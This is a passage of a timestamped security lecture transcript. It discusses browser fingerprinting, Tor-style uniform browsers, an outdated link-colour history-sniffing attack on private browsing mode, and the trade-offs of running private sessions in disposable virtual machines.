              <time_slice>44:47</time_slice>
              <text_slice>you can snarf up
through JavaScript.</text_slice>
            </slice>
            <slice>
              <time_slice>44:48</time_slice>
              <text_slice>Then you run a bunch
of plugins, which</text_slice>
            </slice>
            <slice>
              <time_slice>44:50</time_slice>
              <text_slice>can typically access more stuff
and see what they can snarf up.</text_slice>
            </slice>
            <slice>
              <time_slice>44:53</time_slice>
              <text_slice>And then you see
what's going on.</text_slice>
            </slice>
            <slice>
              <time_slice>44:56</time_slice>
              <text_slice>Does it all make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>44:58</time_slice>
              <text_slice>Yeah, this is basically why
it's very difficult to protect</text_slice>
            </slice>
            <slice>
              <time_slice>45:01</time_slice>
              <text_slice>against a web attacker.</text_slice>
            </slice>
            <slice>
              <time_slice>45:02</time_slice>
              <text_slice>And in particular, getting
back to the discussion we</text_slice>
            </slice>
            <slice>
              <time_slice>45:04</time_slice>
              <text_slice>had about Tor, right, even if
I had gone through Tor-- so</text_slice>
            </slice>
            <slice>
              <time_slice>45:07</time_slice>
              <text_slice>you'll note the IP address--
you don't see it up here.</text_slice>
            </slice>
            <slice>
              <time_slice>45:12</time_slice>
              <text_slice>And so you can
imagine that yeah,</text_slice>
            </slice>
            <slice>
              <time_slice>45:13</time_slice>
              <text_slice>maybe this thing would actually
look at your IP address.</text_slice>
            </slice>
            <slice>
              <time_slice>45:16</time_slice>
              <text_slice>But the thing is
like even if I didn't</text_slice>
            </slice>
            <slice>
              <time_slice>45:17</time_slice>
              <text_slice>know what IP you were
coming from at all,</text_slice>
            </slice>
            <slice>
              <time_slice>45:19</time_slice>
              <text_slice>I can do all these things.</text_slice>
            </slice>
            <slice>
              <time_slice>45:21</time_slice>
              <text_slice>It's pretty maddening.</text_slice>
            </slice>
            <slice>
              <time_slice>45:22</time_slice>
              <text_slice>It's pretty insane.</text_slice>
            </slice>
            <slice>
              <time_slice>45:23</time_slice>
              <text_slice>So there are some
products out there</text_slice>
            </slice>
            <slice>
              <time_slice>45:25</time_slice>
              <text_slice>that tried to do
things like imagine</text_slice>
            </slice>
            <slice>
              <time_slice>45:28</time_slice>
              <text_slice>that you had a proxy
out in the cloud</text_slice>
            </slice>
            <slice>
              <time_slice>45:31</time_slice>
              <text_slice>that all your web
traffic went through.</text_slice>
            </slice>
            <slice>
              <time_slice>45:33</time_slice>
              <text_slice>And then imagine
that proxy tried</text_slice>
            </slice>
            <slice>
              <time_slice>45:34</time_slice>
              <text_slice>to present a canonical
version of a browser runtime.</text_slice>
            </slice>
            <slice>
              <time_slice>45:40</time_slice>
              <text_slice>And imagine that it would
always try to emulate,</text_slice>
            </slice>
            <slice>
              <time_slice>45:42</time_slice>
              <text_slice>let's say, Firefox v 10.7.</text_slice>
            </slice>
            <slice>
              <time_slice>45:46</time_slice>
              <text_slice>Then it would try to
send back the data</text_slice>
            </slice>
            <slice>
              <time_slice>45:48</time_slice>
              <text_slice>that it rendered
as Firefox v 10.7.</text_slice>
            </slice>
            <slice>
              <time_slice>45:51</time_slice>
              <text_slice>So some people would
try to attack this.</text_slice>
            </slice>
            <slice>
              <time_slice>45:53</time_slice>
              <text_slice>It's sort of tricky.</text_slice>
            </slice>
            <slice>
              <time_slice>45:54</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>45:58</time_slice>
              <text_slice>PROFESSOR: I am not--</text_slice>
            </slice>
            <slice>
              <time_slice>45:59</time_slice>
              <text_slice>AUDIENCE: Is that
Tor distributions?</text_slice>
            </slice>
            <slice>
              <time_slice>46:00</time_slice>
              <text_slice>Is that paired with
virtual machines?</text_slice>
            </slice>
            <slice>
              <time_slice>46:02</time_slice>
              <text_slice>[INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>46:05</time_slice>
              <text_slice>PROFESSOR: I see--
so the basic idea--</text_slice>
            </slice>
            <slice>
              <time_slice>46:07</time_slice>
              <text_slice>is it a similar idea to what
we were just talking about?</text_slice>
            </slice>
            <slice>
              <time_slice>46:09</time_slice>
              <text_slice>AUDIENCE: Yes, [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>46:10</time_slice>
              <text_slice>PROFESSOR: Yeah, so I
never heard of that one.</text_slice>
            </slice>
            <slice>
              <time_slice>46:12</time_slice>
              <text_slice>I have heard of some of
these other projects.</text_slice>
            </slice>
            <slice>
              <time_slice>46:14</time_slice>
              <text_slice>I'm imagining there's actually
some trickiness in getting</text_slice>
            </slice>
            <slice>
              <time_slice>46:18</time_slice>
              <text_slice>systems like this to be
efficient a lot of times</text_slice>
            </slice>
            <slice>
              <time_slice>46:20</time_slice>
              <text_slice>because particularly imagine
if you have something that's</text_slice>
            </slice>
            <slice>
              <time_slice>46:22</time_slice>
              <text_slice>interactive.</text_slice>
            </slice>
            <slice>
              <time_slice>46:23</time_slice>
              <text_slice>It's like you want to play a
game or something like that.</text_slice>
            </slice>
            <slice>
              <time_slice>46:26</time_slice>
              <text_slice>It's a little bit
awkward to send my mouse</text_slice>
            </slice>
            <slice>
              <time_slice>46:28</time_slice>
              <text_slice>click to some proxy.</text_slice>
            </slice>
            <slice>
              <time_slice>46:30</time_slice>
              <text_slice>That proxy is then somehow
going to [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>46:34</time_slice>
              <text_slice>AUDIENCE: Let me clarify the
first station virtual machine</text_slice>
            </slice>
            <slice>
              <time_slice>46:38</time_slice>
              <text_slice>actually runs
[INAUDIBLE] Firefox.</text_slice>
            </slice>
            <slice>
              <time_slice>46:41</time_slice>
              <text_slice>In the proxy it's
known as a Tor.</text_slice>
            </slice>
            <slice>
              <time_slice>46:44</time_slice>
              <text_slice>PROFESSOR: Ah, it's
just a Tor proxy.</text_slice>
            </slice>
            <slice>
              <time_slice>46:46</time_slice>
              <text_slice>So if it's a Tor proxy,
sure, that's one thing.</text_slice>
            </slice>
            <slice>
              <time_slice>46:48</time_slice>
              <text_slice>Then the only overhead
there you have to pay</text_slice>
            </slice>
            <slice>
              <time_slice>46:50</time_slice>
              <text_slice>is the regular Tor
overhead of going</text_slice>
            </slice>
            <slice>
              <time_slice>46:53</time_slice>
              <text_slice>through all the onion route.</text_slice>
            </slice>
            <slice>
              <time_slice>46:54</time_slice>
              <text_slice>Yeah, so I was talking
there are systems--</text_slice>
            </slice>
            <slice>
              <time_slice>46:57</time_slice>
              <text_slice>let's ignore the IP
anonymity for a second</text_slice>
            </slice>
            <slice>
              <time_slice>46:59</time_slice>
              <text_slice>because they
basically try to say</text_slice>
            </slice>
            <slice>
              <time_slice>47:01</time_slice>
              <text_slice>you have your own very
fingerprintable browser</text_slice>
            </slice>
            <slice>
              <time_slice>47:04</time_slice>
              <text_slice>on your own machine.</text_slice>
            </slice>
            <slice>
              <time_slice>47:05</time_slice>
              <text_slice>You don't want to expose
that to the web server.</text_slice>
            </slice>
            <slice>
              <time_slice>47:07</time_slice>
              <text_slice>So essentially you
go through a proxy,</text_slice>
            </slice>
            <slice>
              <time_slice>47:09</time_slice>
              <text_slice>which you think
of it all the time</text_slice>
            </slice>
            <slice>
              <time_slice>47:10</time_slice>
              <text_slice>like a headless Firefox let's
say of some canonical version.</text_slice>
            </slice>
            <slice>
              <time_slice>47:14</time_slice>
              <text_slice>The web server thinks it is
interacting with this thing.</text_slice>
            </slice>
            <slice>
              <time_slice>47:16</time_slice>
              <text_slice>So if I go load this site, I
am perceived by the web server</text_slice>
            </slice>
            <slice>
              <time_slice>47:19</time_slice>
              <text_slice>as Firefox 10.7 or whatever.</text_slice>
            </slice>
            <slice>
              <time_slice>47:21</time_slice>
              <text_slice>If you go there, you are also
perceived as Firefox 10.7.</text_slice>
            </slice>
            <slice>
              <time_slice>47:23</time_slice>
              <text_slice>Then behind the scenes its'
spitting out HTML and stuff</text_slice>
            </slice>
            <slice>
              <time_slice>47:26</time_slice>
              <text_slice>like that it collected
from the proxy.</text_slice>
            </slice>
            <slice>
              <time_slice>47:29</time_slice>
              <text_slice>So those two things
are orthogonal.</text_slice>
            </slice>
            <slice>
              <time_slice>47:32</time_slice>
              <text_slice>AUDIENCE: But it seems like you
don't need a proxy for this.</text_slice>
            </slice>
            <slice>
              <time_slice>47:35</time_slice>
              <text_slice>You could have browser
support for this, right?</text_slice>
            </slice>
            <slice>
              <time_slice>47:36</time_slice>
              <text_slice>Meaning the Tor
browser does this</text_slice>
            </slice>
            <slice>
              <time_slice>47:38</time_slice>
              <text_slice>already by trying to appear
as the most generic version</text_slice>
            </slice>
            <slice>
              <time_slice>47:42</time_slice>
              <text_slice>of Firefox.</text_slice>
            </slice>
            <slice>
              <time_slice>47:42</time_slice>
              <text_slice>PROFESSOR: Yeah,
so this is true.</text_slice>
            </slice>
            <slice>
              <time_slice>47:44</time_slice>
              <text_slice>Although, I think a problem
with a lot of those things</text_slice>
            </slice>
            <slice>
              <time_slice>47:46</time_slice>
              <text_slice>that even if you try to lock
yourself into one version,</text_slice>
            </slice>
            <slice>
              <time_slice>47:49</time_slice>
              <text_slice>there's still a lot of things
that can fingerprint it.</text_slice>
            </slice>
            <slice>
              <time_slice>47:51</time_slice>
              <text_slice>So I think with the Tor
distribution, what they often</text_slice>
            </slice>
            <slice>
              <time_slice>47:53</time_slice>
              <text_slice>do is they say, we control
what's in the Tor distribution.</text_slice>
            </slice>
            <slice>
              <time_slice>47:56</time_slice>
              <text_slice>So if we all go down to the Tor
distribution, then forshizzle,</text_slice>
            </slice>
            <slice>
              <time_slice>47:59</time_slice>
              <text_slice>we're both going to get Firefox
with the same Java version--</text_slice>
            </slice>
            <slice>
              <time_slice>48:04</time_slice>
              <text_slice>the same so on and so forth.</text_slice>
            </slice>
            <slice>
              <time_slice>48:05</time_slice>
              <text_slice>AUDIENCE: Well, it's
more than that though.</text_slice>
            </slice>
            <slice>
              <time_slice>48:07</time_slice>
              <text_slice>They return screen sizes that
are the most common screen</text_slice>
            </slice>
            <slice>
              <time_slice>48:09</time_slice>
              <text_slice>sizes whenever you
clear the screen.</text_slice>
            </slice>
            <slice>
              <time_slice>48:11</time_slice>
              <text_slice>PROFESSOR: That's all true.</text_slice>
            </slice>
            <slice>
              <time_slice>48:13</time_slice>
              <text_slice>Yeah, so one thing that's
interesting to look</text_slice>
            </slice>
            <slice>
              <time_slice>48:14</time_slice>
              <text_slice>at though-- the Tor team that
also put out-- the people who</text_slice>
            </slice>
            <slice>
              <time_slice>48:16</time_slice>
              <text_slice>do the bundle-- they'll often
put out reports about what data</text_slice>
            </slice>
            <slice>
              <time_slice>48:19</time_slice>
              <text_slice>still gets leaked.</text_slice>
            </slice>
            <slice>
              <time_slice>48:20</time_slice>
              <text_slice>So stuff does still
get leaked out.</text_slice>
            </slice>
            <slice>
              <time_slice>48:21</time_slice>
              <text_slice>But you're right.</text_slice>
            </slice>
            <slice>
              <time_slice>48:23</time_slice>
              <text_slice>If you could-- the high level
of that goal is very reasonable.</text_slice>
            </slice>
            <slice>
              <time_slice>48:25</time_slice>
              <text_slice>It's saying that
if we all agreed</text_slice>
            </slice>
            <slice>
              <time_slice>48:27</time_slice>
              <text_slice>to download the
same distribution</text_slice>
            </slice>
            <slice>
              <time_slice>48:29</time_slice>
              <text_slice>and to then not trick it out by
adding plugins or stuff like,</text_slice>
            </slice>
            <slice>
              <time_slice>48:32</time_slice>
              <text_slice>then you're exactly right.</text_slice>
            </slice>
            <slice>
              <time_slice>48:33</time_slice>
              <text_slice>That'd work great.</text_slice>
            </slice>
            <slice>
              <time_slice>48:35</time_slice>
              <text_slice>Any other questions?</text_slice>
            </slice>
            <slice>
              <time_slice>48:40</time_slice>
              <text_slice>Yeah, so that is
it for demo time.</text_slice>
            </slice>
            <slice>
              <time_slice>48:51</time_slice>
              <text_slice>And there's more physics.</text_slice>
            </slice>
            <slice>
              <time_slice>48:56</time_slice>
              <text_slice>This must have been a
riveting previous class.</text_slice>
            </slice>
            <slice>
              <time_slice>48:59</time_slice>
              <text_slice>So we will ignore
that for the moment.</text_slice>
            </slice>
            <slice>
              <time_slice>49:01</time_slice>
              <text_slice>Let's see here.</text_slice>
            </slice>
            <slice>
              <time_slice>49:07</time_slice>
              <text_slice>So where were we?</text_slice>
            </slice>
            <slice>
              <time_slice>49:12</time_slice>
              <text_slice>So what is the high-level
goal of privacy?</text_slice>
            </slice>
            <slice>
              <time_slice>49:14</time_slice>
              <text_slice>And you can think
of it as what's</text_slice>
            </slice>
            <slice>
              <time_slice>49:15</time_slice>
              <text_slice>your anonymity set
if you're a user?</text_slice>
            </slice>
            <slice>
              <time_slice>49:18</time_slice>
              <text_slice>So in other words,
how many-- what's</text_slice>
            </slice>
            <slice>
              <time_slice>49:20</time_slice>
              <text_slice>the size of people--
the number of people</text_slice>
            </slice>
            <slice>
              <time_slice>49:22</time_slice>
              <text_slice>that you could be
confused for-- you</text_slice>
            </slice>
            <slice>
              <time_slice>49:25</time_slice>
              <text_slice>could be mistaken
for by an attacker.</text_slice>
            </slice>
            <slice>
              <time_slice>49:26</time_slice>
              <text_slice>And so what the browser
fingerprinting stuff shows</text_slice>
            </slice>
            <slice>
              <time_slice>49:28</time_slice>
              <text_slice>is that oftentimes a web
attacker can narrow you</text_slice>
            </slice>
            <slice>
              <time_slice>49:32</time_slice>
              <text_slice>down to a very, very
tight demographic</text_slice>
            </slice>
            <slice>
              <time_slice>49:35</time_slice>
              <text_slice>without controlling anything on
your local machine whatsoever.</text_slice>
            </slice>
            <slice>
              <time_slice>49:38</time_slice>
              <text_slice>So that's actually little
bit frightening to know.</text_slice>
            </slice>
            <slice>
              <time_slice>49:44</time_slice>
              <text_slice>So you might want
to think about how</text_slice>
            </slice>
            <slice>
              <time_slice>49:47</time_slice>
              <text_slice>can a web attacker determine if
you're using private browsing</text_slice>
            </slice>
            <slice>
              <time_slice>49:50</time_slice>
              <text_slice>mode?</text_slice>
            </slice>
            <slice>
              <time_slice>49:51</time_slice>
              <text_slice>Maybe that's [INAUDIBLE]
for some reason.</text_slice>
            </slice>
            <slice>
              <time_slice>49:53</time_slice>
              <text_slice>So in the paper they
actually describe an attack</text_slice>
            </slice>
            <slice>
              <time_slice>49:56</time_slice>
              <text_slice>that uses link colors.</text_slice>
            </slice>
            <slice>
              <time_slice>49:58</time_slice>
              <text_slice>So remember, in
private browsing mode,</text_slice>
            </slice>
            <slice>
              <time_slice>50:00</time_slice>
              <text_slice>the browsers isn't
supposed to keep</text_slice>
            </slice>
            <slice>
              <time_slice>50:01</time_slice>
              <text_slice>track of the history of
the sites that you visit.</text_slice>
            </slice>
            <slice>
              <time_slice>50:04</time_slice>
              <text_slice>And so in the paper, the
authors describe an attack</text_slice>
            </slice>
            <slice>
              <time_slice>50:07</time_slice>
              <text_slice>in which essentially the
attacker-controlled page</text_slice>
            </slice>
            <slice>
              <time_slice>50:10</time_slice>
              <text_slice>creates an iframe to some URL
that the attacker controls</text_slice>
            </slice>
            <slice>
              <time_slice>50:14</time_slice>
              <text_slice>and loads that inside
the attacker page.</text_slice>
            </slice>
            <slice>
              <time_slice>50:16</time_slice>
              <text_slice>And then it basically
looks at the link colors.</text_slice>
            </slice>
            <slice>
              <time_slice>50:19</time_slice>
              <text_slice>It creates a link
to that page-- that</text_slice>
            </slice>
            <slice>
              <time_slice>50:21</time_slice>
              <text_slice>iframe it just
created-- and then sees</text_slice>
            </slice>
            <slice>
              <time_slice>50:22</time_slice>
              <text_slice>that the link color for that
link is the visited color.</text_slice>
            </slice>
            <slice>
              <time_slice>50:26</time_slice>
              <text_slice>So see it as purple versus blue.</text_slice>
            </slice>
            <slice>
              <time_slice>50:29</time_slice>
              <text_slice>And the idea that if you do this
test in private browsing mode,</text_slice>
            </slice>
            <slice>
              <time_slice>50:33</time_slice>
              <text_slice>then presumably the
link colors should</text_slice>
            </slice>
            <slice>
              <time_slice>50:35</time_slice>
              <text_slice>stay like the unvisited
color because the browser</text_slice>
            </slice>
            <slice>
              <time_slice>50:38</time_slice>
              <text_slice>is supposed to be forgetting
about all this kinds of stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>50:40</time_slice>
              <text_slice>So that's the attack they
describe in the paper.</text_slice>
            </slice>
            <slice>
              <time_slice>50:43</time_slice>
              <text_slice>What's interesting is
that this attack actually</text_slice>
            </slice>
            <slice>
              <time_slice>50:45</time_slice>
              <text_slice>doesn't work anymore.</text_slice>
            </slice>
            <slice>
              <time_slice>50:46</time_slice>
              <text_slice>So we actually discussed this
a couple of lectures back.</text_slice>
            </slice>
            <slice>
              <time_slice>50:49</time_slice>
              <text_slice>So this attack that
the paper describes</text_slice>
            </slice>
            <slice>
              <time_slice>50:51</time_slice>
              <text_slice>is the browser history
sniffing attack.</text_slice>
            </slice>
            <slice>
              <time_slice>50:53</time_slice>
              <text_slice>So as we discussed a
couple of lectures ago,</text_slice>
            </slice>
            <slice>
              <time_slice>50:55</time_slice>
              <text_slice>JavaScript code now does not
expose correct link colors</text_slice>
            </slice>
            <slice>
              <time_slice>50:59</time_slice>
              <text_slice>basically to JavaScript .</text_slice>
            </slice>
            <slice>
              <time_slice>51:02</time_slice>
              <text_slice>And it's precisely to prevent
these types of attacks.</text_slice>
            </slice>
            <slice>
              <time_slice>51:06</time_slice>
              <text_slice>So that particular part
of the paper is outdated.</text_slice>
            </slice>
            <slice>
              <time_slice>51:08</time_slice>
              <text_slice>AUDIENCE: What does it point
to that browsers now also show</text_slice>
            </slice>
            <slice>
              <time_slice>51:11</time_slice>
              <text_slice>links as purple in
private browsing mode</text_slice>
            </slice>
            <slice>
              <time_slice>51:14</time_slice>
              <text_slice>and turn blue again
when you exit.</text_slice>
            </slice>
            <slice>
              <time_slice>51:16</time_slice>
              <text_slice>PROFESSOR: Yeah, it's
a bit weird, yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>51:18</time_slice>
              <text_slice>They implemented that
attack-- the defense--</text_slice>
            </slice>
            <slice>
              <time_slice>51:20</time_slice>
              <text_slice>I think before a lot
of the private browsers</text_slice>
            </slice>
            <slice>
              <time_slice>51:22</time_slice>
              <text_slice>like a popware.</text_slice>
            </slice>
            <slice>
              <time_slice>51:23</time_slice>
              <text_slice>So now they do this
additional thing too.</text_slice>
            </slice>
            <slice>
              <time_slice>51:25</time_slice>
              <text_slice>The long story short, the attack
they describe in the paper</text_slice>
            </slice>
            <slice>
              <time_slice>51:27</time_slice>
              <text_slice>doesn't work because of some
of these browsers sniffing</text_slice>
            </slice>
            <slice>
              <time_slice>51:30</time_slice>
              <text_slice>defenses.</text_slice>
            </slice>
            <slice>
              <time_slice>51:30</time_slice>
              <text_slice>But you can still
imagine that there</text_slice>
            </slice>
            <slice>
              <time_slice>51:32</time_slice>
              <text_slice>may be ways for the web attacker
to figure out if you are</text_slice>
            </slice>
            <slice>
              <time_slice>51:36</time_slice>
              <text_slice>using private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>51:37</time_slice>
              <text_slice>So for example, when you
do private browsing mode,</text_slice>
            </slice>
            <slice>
              <time_slice>51:40</time_slice>
              <text_slice>any cookies that you
got from public mode</text_slice>
            </slice>
            <slice>
              <time_slice>51:42</time_slice>
              <text_slice>should not be sent
during private mode.</text_slice>
            </slice>
            <slice>
              <time_slice>51:45</time_slice>
              <text_slice>So in other words, if I go
to Amazon.com in public mode,</text_slice>
            </slice>
            <slice>
              <time_slice>51:48</time_slice>
              <text_slice>I generate some cookies.</text_slice>
            </slice>
            <slice>
              <time_slice>51:50</time_slice>
              <text_slice>Then I go to Amazon.com
in private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>51:52</time_slice>
              <text_slice>When I contact Amazon.com
in private mode,</text_slice>
            </slice>
            <slice>
              <time_slice>51:54</time_slice>
              <text_slice>those public mode cookies
should not be sent.</text_slice>
            </slice>
            <slice>
              <time_slice>51:57</time_slice>
              <text_slice>That can actually act as
the sign to the web attacker</text_slice>
            </slice>
            <slice>
              <time_slice>52:02</time_slice>
              <text_slice>that you actually are
using private mode.</text_slice>
            </slice>
            <slice>
              <time_slice>52:04</time_slice>
              <text_slice>AUDIENCE: This is also now
you're using the canvass</text_slice>
            </slice>
            <slice>
              <time_slice>52:06</time_slice>
              <text_slice>in both of these events, right?</text_slice>
            </slice>
            <slice>
              <time_slice>52:08</time_slice>
              <text_slice>So you need to know
the IP address.</text_slice>
            </slice>
            <slice>
              <time_slice>52:10</time_slice>
              <text_slice>PROFESSOR: Yeah, that's right.</text_slice>
            </slice>
            <slice>
              <time_slice>52:12</time_slice>
              <text_slice>AUDIENCE: So that
link that you were</text_slice>
            </slice>
            <slice>
              <time_slice>52:14</time_slice>
              <text_slice>targeting with the link color
would be on a per IP basis.</text_slice>
            </slice>
            <slice>
              <time_slice>52:17</time_slice>
              <text_slice>And you would have to
rely that the user first</text_slice>
            </slice>
            <slice>
              <time_slice>52:19</time_slice>
              <text_slice>visited it as a public
mode, and you protect it.</text_slice>
            </slice>
            <slice>
              <time_slice>52:21</time_slice>
              <text_slice>PROFESSOR: Ah, so the
link-- so the link</text_slice>
            </slice>
            <slice>
              <time_slice>52:23</time_slice>
              <text_slice>attack you can actually do in
the context of a single page.</text_slice>
            </slice>
            <slice>
              <time_slice>52:26</time_slice>
              <text_slice>So imagine that I,
the web attacker,</text_slice>
            </slice>
            <slice>
              <time_slice>52:29</time_slice>
              <text_slice>construct single page.</text_slice>
            </slice>
            <slice>
              <time_slice>52:30</time_slice>
              <text_slice>I, the attacker, have JavaScript
that creates an iframe</text_slice>
            </slice>
            <slice>
              <time_slice>52:33</time_slice>
              <text_slice>to foo.com like this.</text_slice>
            </slice>
            <slice>
              <time_slice>52:35</time_slice>
              <text_slice>So that iframe will load
the contents of that page.</text_slice>
            </slice>
            <slice>
              <time_slice>52:38</time_slice>
              <text_slice>And then I, the attacker,
in the parent frame</text_slice>
            </slice>
            <slice>
              <time_slice>52:40</time_slice>
              <text_slice>can then create a
link element and then</text_slice>
            </slice>
            <slice>
              <time_slice>52:42</time_slice>
              <text_slice>try to look at the color.</text_slice>
            </slice>
            <slice>
              <time_slice>52:44</time_slice>
              <text_slice>This worked four years ago.</text_slice>
            </slice>
            <slice>
              <time_slice>52:46</time_slice>
              <text_slice>So in that case, it doesn't rely
on the user having explicitly</text_slice>
            </slice>
            <slice>
              <time_slice>52:49</time_slice>
              <text_slice>visited that iframe page at
all because I, the attacker,</text_slice>
            </slice>
            <slice>
              <time_slice>52:53</time_slice>
              <text_slice>can create that in the
context of the page.</text_slice>
            </slice>
            <slice>
              <time_slice>52:56</time_slice>
              <text_slice>I have gotten [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>52:59</time_slice>
              <text_slice>Any other questions?</text_slice>
            </slice>
            <slice>
              <time_slice>53:01</time_slice>
              <text_slice>So yeah, so you can maybe
think about how cookies</text_slice>
            </slice>
            <slice>
              <time_slice>53:04</time_slice>
              <text_slice>can reveal public and
private browsing modes</text_slice>
            </slice>
            <slice>
              <time_slice>53:06</time_slice>
              <text_slice>and things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>53:08</time_slice>
              <text_slice>So one thing we
might think about</text_slice>
            </slice>
            <slice>
              <time_slice>53:12</time_slice>
              <text_slice>is how we can provide
a stronger privacy</text_slice>
            </slice>
            <slice>
              <time_slice>53:21</time_slice>
              <text_slice>guarantee for private browsers?</text_slice>
            </slice>
            <slice>
              <time_slice>53:29</time_slice>
              <text_slice>And for the sake
of this discussion,</text_slice>
            </slice>
            <slice>
              <time_slice>53:35</time_slice>
              <text_slice>let's just ignore
IP addresses for now</text_slice>
            </slice>
            <slice>
              <time_slice>53:41</time_slice>
              <text_slice>because as we'll
discuss next lecture,</text_slice>
            </slice>
            <slice>
              <time_slice>53:45</time_slice>
              <text_slice>we can used Tor to
maybe help with some</text_slice>
            </slice>
            <slice>
              <time_slice>53:47</time_slice>
              <text_slice>of the privacy of IP addresses.</text_slice>
            </slice>
            <slice>
              <time_slice>53:49</time_slice>
              <text_slice>So one thing you
can imagine doing</text_slice>
            </slice>
            <slice>
              <time_slice>53:51</time_slice>
              <text_slice>is you can imagine
using VMs in some way</text_slice>
            </slice>
            <slice>
              <time_slice>53:55</time_slice>
              <text_slice>to help provide stronger private
browsing guaranteed-- so VM</text_slice>
            </slice>
            <slice>
              <time_slice>54:06</time_slice>
              <text_slice>level privacy.</text_slice>
            </slice>
            <slice>
              <time_slice>54:08</time_slice>
              <text_slice>And so the basic
idea is that you</text_slice>
            </slice>
            <slice>
              <time_slice>54:11</time_slice>
              <text_slice>want to run each private
session inside of a separate VM.</text_slice>
            </slice>
            <slice>
              <time_slice>54:25</time_slice>
              <text_slice>And then when the user
is done with that--</text_slice>
            </slice>
            <slice>
              <time_slice>54:29</time_slice>
              <text_slice>so is finished with the
private browsing session,</text_slice>
            </slice>
            <slice>
              <time_slice>54:31</time_slice>
              <text_slice>you basically delete VM
after that session is done.</text_slice>
            </slice>
            <slice>
              <time_slice>54:43</time_slice>
              <text_slice>So what's the advantage of this?</text_slice>
            </slice>
            <slice>
              <time_slice>54:47</time_slice>
              <text_slice>Well, what's nice about
this is presumably</text_slice>
            </slice>
            <slice>
              <time_slice>54:51</time_slice>
              <text_slice>you can get some
stronger guarantees</text_slice>
            </slice>
            <slice>
              <time_slice>54:52</time_slice>
              <text_slice>about what privacy properties
you can provide to the user</text_slice>
            </slice>
            <slice>
              <time_slice>54:58</time_slice>
              <text_slice>because, presumably,
the VM has a pretty</text_slice>
            </slice>
            <slice>
              <time_slice>55:01</time_slice>
              <text_slice>clean interface to the I/O
path of the underlying post-OS.</text_slice>
            </slice>
            <slice>
              <time_slice>55:06</time_slice>
              <text_slice>So you can imagine
that maybe you</text_slice>
            </slice>
            <slice>
              <time_slice>55:07</time_slice>
              <text_slice>combine this VMs into let's
say some type of a secure swap</text_slice>
            </slice>
            <slice>
              <time_slice>55:13</time_slice>
              <text_slice>solution like Open BSD has--
give us another encrypted disk</text_slice>
            </slice>
            <slice>
              <time_slice>55:16</time_slice>
              <text_slice>type thing.</text_slice>
            </slice>
            <slice>
              <time_slice>55:16</time_slice>
              <text_slice>So you can imagine, OK, we have
a very clean separation of VM</text_slice>
            </slice>
            <slice>
              <time_slice>55:21</time_slice>
              <text_slice>up here and all the I/Os
that are generated down here.</text_slice>
            </slice>
            <slice>
              <time_slice>55:24</time_slice>
              <text_slice>And so that gives you
stronger guarantees</text_slice>
            </slice>
            <slice>
              <time_slice>55:27</time_slice>
              <text_slice>than what you can get from the
browser, which wasn't designed</text_slice>
            </slice>
            <slice>
              <time_slice>55:30</time_slice>
              <text_slice>from the ground up to think
very carefully about all the I/O</text_slice>
            </slice>
            <slice>
              <time_slice>55:33</time_slice>
              <text_slice>paths and what secrets might
leak when it was in storage.</text_slice>
            </slice>
            <slice>
              <time_slice>55:38</time_slice>
              <text_slice>So yes, this
provides what's nice</text_slice>
            </slice>
            <slice>
              <time_slice>55:42</time_slice>
              <text_slice>about this-- strong guarantees.</text_slice>
            </slice>
            <slice>
              <time_slice>55:48</time_slice>
              <text_slice>And, also, what's nice
is it doesn't require</text_slice>
            </slice>
            <slice>
              <time_slice>55:52</time_slice>
              <text_slice>any changes to your
applications-- that</text_slice>
            </slice>
            <slice>
              <time_slice>55:57</time_slice>
              <text_slice>is to say to the browser.</text_slice>
            </slice>
            <slice>
              <time_slice>55:58</time_slice>
              <text_slice>You take your browser,
put it inside one</text_slice>
            </slice>
            <slice>
              <time_slice>56:00</time_slice>
              <text_slice>of these VMs-- then everything
gets better all magically.</text_slice>
            </slice>
            <slice>
              <time_slice>56:03</time_slice>
              <text_slice>It's not location change.</text_slice>
            </slice>
            <slice>
              <time_slice>56:06</time_slice>
              <text_slice>So what's bad about this--
I'll use an unhappy face</text_slice>
            </slice>
            <slice>
              <time_slice>56:11</time_slice>
              <text_slice>to demonstrate that.</text_slice>
            </slice>
            <slice>
              <time_slice>56:12</time_slice>
              <text_slice>So what's bad is first
of all, it's heavyweight.</text_slice>
            </slice>
            <slice>
              <time_slice>56:17</time_slice>
              <text_slice>And by heavyweight,
I mean that time you</text_slice>
            </slice>
            <slice>
              <time_slice>56:20</time_slice>
              <text_slice>want to spin up one of these
private browsing sessions,</text_slice>
            </slice>
            <slice>
              <time_slice>56:22</time_slice>
              <text_slice>you have to spin up a whole VM.</text_slice>
            </slice>
            <slice>
              <time_slice>56:25</time_slice>
              <text_slice>And that can actually
be pretty painful.</text_slice>
            </slice>
            <slice>
              <time_slice>56:27</time_slice>
              <text_slice>So perhaps users are
going to get upset</text_slice>
            </slice>
            <slice>
              <time_slice>56:28</time_slice>
              <text_slice>because it's going to
take them long time now</text_slice>
            </slice>
            <slice>
              <time_slice>56:30</time_slice>
              <text_slice>to launch these private
browsing sessions.</text_slice>
            </slice>
            <slice>
              <time_slice>56:32</time_slice>
              <text_slice>And the other problems to is
this solution actually has</text_slice>
            </slice>
            <slice>
              <time_slice>56:36</time_slice>
              <text_slice>bad usability.</text_slice>
            </slice>
            <slice>
              <time_slice>56:39</time_slice>
              <text_slice>And the reason I say that
is because now it's actually</text_slice>
            </slice>
            <slice>
              <time_slice>56:43</time_slice>
              <text_slice>difficult for users to
do things like take files</text_slice>
            </slice>
            <slice>
              <time_slice>56:47</time_slice>
              <text_slice>that they've saved in
private browsing mode</text_slice>
            </slice>
            <slice>
              <time_slice>56:49</time_slice>
              <text_slice>and then take them to the
rest of their computer--</text_slice>
            </slice>
            <slice>
              <time_slice>56:52</time_slice>
              <text_slice>any bookmarks that they generate
during private browsing mode</text_slice>
            </slice>
            <slice>
              <time_slice>56:54</time_slice>
              <text_slice>that who they actually
do want to persist</text_slice>
            </slice>
            <slice>
              <time_slice>56:57</time_slice>
              <text_slice>will be difficult to
